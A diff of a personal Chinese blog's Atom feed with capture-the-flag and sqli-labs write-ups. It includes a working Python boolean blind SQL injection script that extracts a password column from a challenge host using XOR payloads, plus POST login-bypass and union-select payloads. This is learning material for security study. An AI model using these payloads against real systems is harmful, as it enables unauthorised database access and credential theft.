@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2022-02-26T08:23:37.422Z</updated>
+  <updated>2022-02-27T04:55:00.565Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,31 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>misc总结之图片隐写术</title>
+    <link href="http://example.com/2022/02/27/misc%E6%80%BB%E7%BB%93%E4%B9%8B%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E6%9C%AF/"/>
+    <id>http://example.com/2022/02/27/misc%E6%80%BB%E7%BB%93%E4%B9%8B%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E6%9C%AF/</id>
+    <published>2022-02-27T04:46:16.000Z</published>
+    <updated>2022-02-27T04:55:00.565Z</updated>
+    
+    <content type="html"><![CDATA[<p>内容参考<a href="https://xz.aliyun.com/t/1833">MISC总结—隐写术之图片隐写</a></p><h1 id="内容："><a href="#内容：" class="headerlink" title="内容："></a>内容：</h1><ol><li>附加件的图片隐写</li><li>基于文件结构的图片隐写</li><li>基于LSB原理的图片隐写</li><li>基于DCT域的JPG图片隐写</li><li>数字水印的隐写</li><li>图片容差的隐写</li></ol>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;内容参考&lt;a href=&quot;https://xz.aliyun.com/t/1833&quot;&gt;MISC总结—隐写术之图片隐写&lt;/a&gt;&lt;/p&gt;
+&lt;h1 id=&quot;内容：&quot;&gt;&lt;a href=&quot;#内容：&quot; class=&quot;headerlink&quot; title=&quot;内容：&quot;&gt;&lt;/a&gt;内容：&lt;/h1</summary>
+      
+    
+    
+    
+    <category term="misc" scheme="http://example.com/categories/misc/"/>
+    
+    
+    <category term="兼职miscer" scheme="http://example.com/tags/%E5%85%BC%E8%81%8Cmiscer/"/>
+    
+  </entry>
   
   <entry>
     <title>misc考核</title>
@@ -407,7 +432,7 @@
     <link href="http://example.com/2021/11/19/wp/"/>
     <id>http://example.com/2021/11/19/wp/</id>
     <published>2021-11-19T12:53:10.000Z</published>
-    <updated>2022-02-06T08:53:11.291Z</updated>
+    <updated>2022-02-27T11:33:31.497Z</updated>
     
     <content type="html"><![CDATA[<h1 id="第一次写盲注脚本"><a href="#第一次写盲注脚本" class="headerlink" title="第一次写盲注脚本"></a>第一次写盲注脚本</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">280</span>):</span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high = <span class="number">128</span></span><br><span class="line">    mid = (low + high) &gt;&gt; <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span>(high&gt;low):</span><br><span class="line">        url = <span class="string">&quot;http://5ab2fc5d-f744-4401-9552-f1b496e7e678.node4.buuoj.cn:81/search.php&quot;</span></span><br><span class="line">        <span class="comment">#payload=&quot;?id=1^(ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),&#123;&#125;,1))&gt;&#123;&#125;)^1&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment">#查库</span></span><br><span class="line">        <span class="comment">#payload =&quot;?id=1^(ascii(substr((select(database())),&#123;&#125;,1))&gt;&#123;&#125;)^1&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment">#查列</span></span><br><span class="line">        <span class="comment">#payload=&quot;?id=1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),&#123;&#125;,1))&gt;&#123;&#125;)^1&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment">#查表</span></span><br><span class="line">        <span class="comment">#payload=&quot;?id=1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;F1naI1y&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;)^1&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment">#查字段</span></span><br><span class="line">        payload= <span class="string">&quot;?id=1^(ascii(substr((select(group_concat(password))from(F1naI1y)),&#123;&#125;,1))&gt;&#123;&#125;)^1&quot;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line">        <span class="comment">#查password</span></span><br><span class="line">        url+=payload</span><br><span class="line">        r = requests.get(url)</span><br><span class="line">        time.sleep(<span class="number">0.04</span>)</span><br><span class="line">        <span class="comment">#print(url)</span></span><br><span class="line">        <span class="comment">#print(r.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Cl&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            low=mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high=mid</span><br><span class="line">        mid=(low+high)&gt;&gt;<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> (mid==<span class="number">32</span> <span class="keyword">or</span> mid==<span class="number">128</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="comment">#print(chr(mid))</span></span><br><span class="line">    flag += <span class="built_in">chr</span> (mid)</span><br><span class="line">    <span class="comment">#print(mid)</span></span><br><span class="line">    <span class="comment">#print(chr(mid))</span></span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="总结步骤"><a href="#总结步骤" class="headerlink" title="总结步骤"></a>总结步骤</h1><ol><li>fuzz查过滤</li><li>考虑查注入</li><li>然后写脚本</li></ol><p><img src="https://i.loli.net/2021/11/19/n5blAoWmT41eLUJ.png" alt="QQ截图20211119210158.png"></p><p>根据提示，尝试对？id=进行fuzz</p><p>发现空格和and和||和$$被过滤了</p><p>而^没有被过滤</p><p>尝试用1^^1</p><p><img src="https://i.loli.net/2021/11/19/dH3Y57PkpW9xgLF.png" alt="QQ截图20211119211628.png"></p><p>可以利用可行的注入符合提供思路</p><p>“1^ 0 ^ 1”为假</p><p>“1 ^ 1 ^ 1”为真来嵌套语句</p><h1 id="利用二分法来简化爆破"><a href="#利用二分法来简化爆破" class="headerlink" title="利用二分法来简化爆破"></a>利用二分法来简化爆破</h1><p>32是空格，ascii最多到127，所以可显字符是32到127</p><p>我们取中间数为mid为80，high为128，low为32（方便除二）</p><p>若这个要猜的值比80大，就到80到128的区间类取中值比较，以此类推，因为这个数必是整数，所以必可以找到。</p><p><img src="https://i.loli.net/2021/11/19/CFx2wMBOHc5yViq.png" alt="QQ截图20211119212958.png"></p><p>最后在一大堆password里面找到。</p>]]></content>
     
@@ -421,6 +446,8 @@
     
     <category term="sql注入" scheme="http://example.com/categories/sql%E6%B3%A8%E5%85%A5/"/>
     
+    
+    <category term="sql注入" scheme="http://example.com/tags/sql%E6%B3%A8%E5%85%A5/"/>
     
   </entry>
   
@@ -461,31 +488,6 @@
       
       
     <summary type="html">&lt;h1 id=&quot;less17的注入过滤&quot;&gt;&lt;a href=&quot;#less17的注入过滤&quot; class=&quot;headerlink&quot; title=&quot;less17的注入过滤&quot;&gt;&lt;/a&gt;less17的注入过滤&lt;/h1&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;</summary>
-      
-    
-    
-    
-    <category term="sql注入" scheme="http://example.com/categories/sql%E6%B3%A8%E5%85%A5/"/>
-    
-    
-    <category term="sql注入" scheme="http://example.com/tags/sql%E6%B3%A8%E5%85%A5/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>less11-16</title>
-    <link href="http://example.com/2021/11/06/less11-16/"/>
-    <id>http://example.com/2021/11/06/less11-16/</id>
-    <published>2021-11-06T03:00:03.000Z</published>
-    <updated>2021-11-10T11:49:56.031Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="less-11"><a href="#less-11" class="headerlink" title="less 11"></a>less 11</h1><p>这关让我们输入账号密码，而不是简单的?id=1，所以直接夹断.</p><p><img src="https://i.loli.net/2021/11/06/gwi27DpZWobJkRd.png" alt="QQ截图20211106114439.png"></p><p>代理抓包发现题与以往不同</p><p>以往采用的是get方法，而这里是post方法，以至于我们在submit之无法看到输入的usename和password</p><p>但是本质上还是之前的报错注入，不过是基于post的提交方式</p><p><img src="https://i.loli.net/2021/11/06/13BEjwb6MlFcCOD.png" alt="QQ截图20211106115325.png"></p><p>利用抓包得到的信息可知上传的data为：uname=&amp;passwd=&amp;submit=%E6%8F%90%E4%BA%A4</p><p>所以基于此，进行报错注入</p><p>首先我们不知道账号密码，利用注释符和 or 1=1使其为真</p><p>uname=n‘ or 1=1 #&amp;passwd=&amp;submit=%E6%8F%90%E4%BA%A4</p><p>这样无论账号存不存在都可以登入（猜的）</p><p>事实也是这样，这里返回了账号密码和我们输入的不一样，但是我们知道我们成功登入了，注释符以前的內容是可执行的这样接下来就是类似less1的内容</p><p>order by n 查看列数</p><p>union select 1，2，。。n查看回显</p><p>按照回显来嵌套</p><p>select database();</p><p>select schema_name from information_schema.schemata;</p><p>select table_name from information_schema.tables where table_schema=’A’;</p><p>select column_name from information_schema.column where table_name=’B’;</p><p>select username,password from where A.B;</p><p>利用group_concat()和concat_ws()来简便操作</p><p><img src="https://i.loli.net/2021/11/07/wF5CMxKoJOG1NcV.png" alt="QQ截图20211107111426.png"></p><h1 id="less-12"><a href="#less-12" class="headerlink" title="less 12"></a>less 12</h1><p>同理同法，不过是把单引号改为双引号单括号。</p><p>测试注入可以依次测试’  ,  ‘)  ,  ‘))  ,  “  ,  “)  ,  “))六种</p><h1 id="less13"><a href="#less13" class="headerlink" title="less13"></a>less13</h1><p>同样操作</p><p>post data：uname=1’) or 1=1#&amp;passwd=1&amp;submit=Submit</p><p>这次没有报错，但也没有回显</p><p>属于布尔盲注</p><p>post data：uname=1’) or length(database()&gt;1#&amp;passwd=1&amp;submit=Submit来判断数据库名长度</p><p>post data：uname=1’) or left（（select schema_name from information_schema.schemata limit 0,1）,1）=’a’#&amp;passwd=1&amp;submit=Submit来判断列名</p><p>PS：or左右两边其中一边为真都为真，已知左为假，所以只有有报错则右边为假就会报错，所以利用此来破解库名，表名，列名。</p><p>利用工具进行爆破详见less5,6总结</p><p>13     (‘’)</p><p>14      “”</p><p>15       ‘’</p><p>16       (“”)</p><p>less13,14,15,16同样的方法只是对数据的包裹方式不同。</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;less-11&quot;&gt;&lt;a href=&quot;#less-11&quot; class=&quot;headerlink&quot; title=&quot;less 11&quot;&gt;&lt;/a&gt;less 11&lt;/h1&gt;&lt;p&gt;这关让我们输入账号密码，而不是简单的?id=1，所以直接夹断.&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;h</summary>
       
     
     
